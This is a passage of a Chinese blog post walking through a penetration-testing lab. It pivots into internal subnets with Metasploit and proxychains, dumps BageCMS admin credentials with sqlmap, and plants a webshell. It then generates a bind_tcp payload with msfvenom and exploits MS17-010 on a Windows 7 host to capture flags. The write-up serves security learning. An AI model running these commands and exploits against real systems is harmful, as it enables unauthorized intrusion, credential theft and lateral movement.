+<p>发现它有两个网段：一个是 <code>192.168.1.10/24</code>，另一个是 <code>192.168.22.0/24</code>！随后我只给后者添加一个路由表（因为前者的内网主机有我内网的主机，就不添加了！）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.22.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1112.jpg" alt="图片"></p>
+<p>添加成功后我需要对它的内网进行扫描，看看内网中有多少存活的主机！我用到的扫描模块是这个：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/tcp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1113.jpg" alt="图片"></p>
+<p>扫描出来发现 <code>192.168.22.22</code> 这台主机存活，肯定有人会说 <code>192.168.22.11</code> 这台主机不是也存活吗？实际上<code>192.168.22.11</code>这台主机就是我们的<code>WEB</code>服务器！所以说我们就怼<code>192.168.22.22</code>这台主机！</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1114.jpg" alt="图片"></p>
+<p>紧接着后渗透我使用了 <code>socks4</code> 代理，用到的模块是这个：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/server/socks4a</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1115.jpg" alt="图片"></p>
+<p>然后我们还需要设置一下 <code>proxychain</code> 代理：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1116.jpg" alt="图片"></p>
+<p>设置完后我们就可以对它内网进行扫描了！首先是对它进行端口扫描看看它开放了那些端口服务：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -Pn -sT 192.168.22.22</span><br><span class="line">注释：（因为socks4不支持ICMP协议，所以我们就不用对它使用ping，所以就使用-Pn 参数，而-sT是使用TCP扫描）</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1117.jpg" alt="图片"></p>
+<p>由上图可知，它开放了 <code>21</code>(ftp)、<code>22</code>（ssh）、<code>80</code>（http）、<code>3306</code>（mysql）、<code>8888</code>（sun-answerbook）这些端口服务！先从 <code>80</code> 的 <code>web</code> 服务开始查看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.22.22/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1118.jpg" alt="图片"></p>
+<h2 id="BageCMS-SQL注入"><a href="#BageCMS-SQL注入" class="headerlink" title="BageCMS-SQL注入"></a>BageCMS-SQL注入</h2><p>打开后发现网站 <code>CMS</code> 是 <code>BageCMS</code>，我还是先对它进行目录扫描吧，看看有什么目录文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains dirb http://192.168.22.22</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1119.jpg" alt="图片"></p>
+<p>扫描得到了一个 <code>robots.txt</code> 文件，打开后发现了他的目录文件、后台地址和 <code>CMS</code> 信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.22.22/robots.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1120.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1121.png" alt="图片"></p>
+<p>尝试了弱口令后没有成功！紧接着我查看了它的主页源码发现了一个提示信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint：SQL注入点：/index.php?r=vul&amp;keyword=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1122.png" alt="图片"></p>
+<p>既然靶场作者都提示说是<code>SQL</code>注入，那么直接上<code>Sqlmap</code>一梭哈获取到了后台账号和密码hash：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains sqlmap -u &quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot; -p keyword -D bagecms -T bage_admin -C username,password –dump</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: bagecms</span><br><span class="line">Table: bage_admin</span><br><span class="line">[1 entry]</span><br><span class="line">+----------+-------------------------------------------+</span><br><span class="line">| username | password                                  |</span><br><span class="line">+----------+-------------------------------------------+</span><br><span class="line">| admin    | 46f94c8de14fb36680850768ff1b7f2a (123qwe) |</span><br><span class="line">+----------+-------------------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1123.png" alt="图片"></p>
+<h2 id="BageCMS-后台Getshell"><a href="#BageCMS-后台Getshell" class="headerlink" title="BageCMS-后台Getshell"></a>BageCMS-后台Getshell</h2><p>拿到后台账号密码登录进去后得到了一个 <code>Flag</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;eS3sd1IKarw&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1124.png" alt="图片"></p>
+<p>接下来就要获取<code>webshell</code>了，我是在后台模板这里找到了可以编辑<code>PHP</code>文件的地方：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1125.png" alt="图片"></p>
+<p>随后编辑 <code>index.php</code> 写入一句话到里面：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1126.png" alt="图片"></p>
+<p>然后再设置一下 <code>Proxifier</code> 的代理规则：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1127.png" alt="图片"></p>
+<p>这样就可以使用蚁剑连接<code>webshell</code>了：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1128.png" alt="图片"></p>
+<p>紧接着我在 <code>upload</code> 目录找到了 <code>Flag</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;23ASfqwr4t2e&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1130.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1131.png" alt="图片"></p>
+<p>我们再使用 <code>MSF</code> 生成一个木马让它上线吧，这里我使用的是<code>正向</code>Payload（因为在内网中它无法访问到外网，所以就只能我们去连接它）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=5555 -f elf &gt; 5555.elf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1132.png" alt="图片"></p>
+<p>然后打开我们的 <code>MSF</code> （这里需要使用代理打开，不然反弹不回来shell）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains msfconsole</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1133.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1134.png" alt="图片"></p>
+<h2 id="杀入第三层内网Target3"><a href="#杀入第三层内网Target3" class="headerlink" title="杀入第三层内网Target3"></a>杀入第三层内网Target3</h2><p>反弹回来之后我查看<code>ifconfig</code>发现了两个可用的网卡：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1135.png" alt="图片"></p>
+<p>然后获取当前网卡可用的网段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run get_local_subnets</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1136.png" alt="图片"></p>
+<p>从上图可以看到，他有两个网段，第一个是 <code>192.168.22.0/24</code>，第二个是 <code>192.168.33.0/24</code>，我们重复之前的操作，添加一个路由表到后者：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.33.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1137.jpg" alt="图片"></p>
+<p>添加成功后我们使用之前那个扫描模块，设置好 <code>PORTS</code>、<code>RHOSTS</code>：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1138.jpg" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1139.jpg" alt="图片"></p>
+<p>扫描完后发现发开放了<code>445</code>和<code>3389</code>端口，因此判断有可能是 <code>Windows</code> 系统！</p>
+<p>为了验证，我使用了这个模块去探测它的操作系统：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/smb/smb_version</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1140.jpg" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1141.jpg" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[+] 192.168.33.33:445     - Host is running Windows 7 Ultimate SP1 (build:7601) (name:WIN-POVQ8FCTTO4)</span><br></pre></td></tr></table></figure>
+
+<p>果然是 <code>Windwo</code>s 的系统，而且版本是<code>Windows 7 Ultimate SP1</code>！既然它是 <code>Windwos 7</code> 系统，而且开放了 <code>445</code> 端口，有没有可能会存在<code>MS17-010</code>（永恒之蓝）呢？</p>
+<h2 id="Windwos7-MS17-010提权拿到Flag"><a href="#Windwos7-MS17-010提权拿到Flag" class="headerlink" title="Windwos7-MS17-010提权拿到Flag"></a>Windwos7-MS17-010提权拿到Flag</h2><p>紧接着我使用了<code>MSF</code>的模块对它进行探测看看是否存在永恒之蓝，我使用的辅助模块是这个：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/smb/smb_ms17_010</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1142.jpg" alt="图片"></p>
+<p>由上图可知，<code>MSF</code> 检测出 <code>192.168.33.33</code> 这台主机存在<code>MS17-010</code>（永恒之蓝）！那么我们就可以对它进行利用，接下来使用这个利用模块：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/smb/ms17_010_psexec</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1143.jpg" alt="图片"></p>
+<p>注意一下，我们选择 <code>MS17_010</code> 这个利用模块后，我们还需要设置一下 <code>Payload</code> ，因为它默认的是 <code>reverse_tcp</code>(反向)，而它主机不能出外网所以就只能使用<code>正向</code>（bind_tcp）我们去连接它！</p>
+<p>设置好参数后运行 <code>exploit</code> 获取到一枚 <code>Meterpreter</code>：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1144.jpg" alt="图片"></p>
+<p>由上图可知，我们已经是系统权限了！最后就是找到<code>Flag</code>文件：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1145.jpg" alt="图片"></p>
+<p>最终也是在 <code>Administrator</code> 用户的 <code>Desktop</code> 桌面找到了 <code>Flag.txt</code>！</p>
+<h2 id="微信公众号"><a href="#微信公众号" class="headerlink" title="微信公众号"></a>微信公众号</h2><p>公众号：<code>saulGoodman</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/weixin/weixin.jpg" alt="saulGoodman"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2020/02/18/Red-Teaming-CFS/">http://example.com/2020/02/18/Red-Teaming-CFS/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"># 权限提升</a>
+                    
+                        <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"># 内网渗透</a>
+                    
+                        <a href="/tags/RedTeaming/"># RedTeaming</a>
+                    
+                        <a href="/tags/%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/"># 横向渗透</a>
+                    
+                        <a href="/tags/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/"># 永恒之蓝</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/02/23/Vulnhub-DC-2/">VulnHub通关日记-DC_2-Walkthrough</a>
+            
+            
+            <a class="next" rel="next" href="/2020/02/18/Vulnhub-DC-1/">VulnHub通关日记-DC_1-Walkthrough</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
